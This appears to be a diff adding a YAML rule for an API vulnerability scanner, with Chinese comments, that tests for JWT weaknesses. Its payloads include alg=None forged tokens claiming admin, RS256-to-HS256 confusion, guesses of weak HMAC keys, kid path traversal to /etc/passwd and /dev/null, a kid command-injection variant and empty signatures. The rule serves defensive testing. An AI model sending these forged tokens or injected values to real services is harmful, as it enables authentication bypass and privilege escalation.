@@ -1,0 +1,69 @@
+# JWT 弱点检测规则（v3.5 增强版）
+# 覆盖：alg=None、空签名、弱密钥、算法混淆、kid 注入、过期 Token、跨服务复用
+name: jwt_weakness
+description: JWT Weakness — JSON Web Token 签名/算法/配置漏洞
+severity: high
+owasp: "API2:2023 — Broken Authentication"
+confidence: 0.85
+enabled: true
+
+endpoint_filter:
+  methods: [GET, POST, PUT, PATCH, DELETE]
+  param_types: [header]
+
+payloads:
+  # ====== alg=None 攻击（最常见的 JWT 漏洞）======
+  - value: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0."
+    description: "alg=None 绕过签名验证 — admin 身份"
+  - value: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0."
+    description: "alg=None + role=admin 权限提升"
+  - value: "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9."
+    description: "alg=None 大小写变体 (None)"
+
+  # ====== 算法混淆攻击 ======
+  - value: "alg=HS256 使用公钥签名"
+    description: "RS256→HS256 算法降级：用公钥当 HMAC 密钥签名"
+  - value: "alg=HS256 key='' (空密钥)"
+    description: "HMAC 空密钥签名"
+
+  # ====== 弱密钥暴力破解标记 ======
+  - value: "HMAC-SHA256 签名密钥 'secret'"
+    description: "尝试弱密钥: secret"
+  - value: "HMAC-SHA256 签名密钥 'password'"
+    description: "尝试弱密钥: password"
+  - value: "HMAC-SHA256 签名密钥 '123456'"
+    description: "尝试弱密钥: 123456"
+  - value: "HMAC-SHA256 签名密钥 'jwt_secret'"
+    description: "尝试默认密钥: jwt_secret"
+
+  # ====== kid (Key ID) 注入 ======
+  - value: "kid=../../etc/passwd"
+    description: "kid 参数路径遍历 — 读取任意文件作为密钥"
+  - value: "kid=/dev/null"
+    description: "kid 指向空文件 — 空密钥绕过"
+  - value: "kid=../../../../dev/null|base64_encoded_payload"
+    description: "kid 命令注入变体"
+
+  # ====== 空签名 / 缺失签名 ======
+  - value: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9."
+    description: "空签名 — 签名部分留空"
+  - value: "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9."
+    description: "移除 typ 声明 + 空签名"
+
+  # ====== 无 Authorization Header ======
+  - value: ""
+    description: "完全没有 Authorization header — 测试是否需要鉴权"
+
+  # ====== 过期/篡改 Token ======
+  - value: "FORGED_BEARER_TOKEN_PLACEHOLDER"
+    description: "伪造 Token — 修改 payload 中的 sub/userId"
+  - value: "EXPIRED_BEARER_TOKEN_PLACEHOLDER"
+    description: "过期 Token 重用测试"
+
+exploit_indicator:
+  patterns:
+    - "200 OK"
+  status_codes: [200]
+
+expected_normal: "JWT 应强制验证签名算法、拒绝 alg=None、使用强密钥 (≥256bit)、不信任客户端提供的 kid"
+reasoning_template: "JWT 弱点测试: {description}"
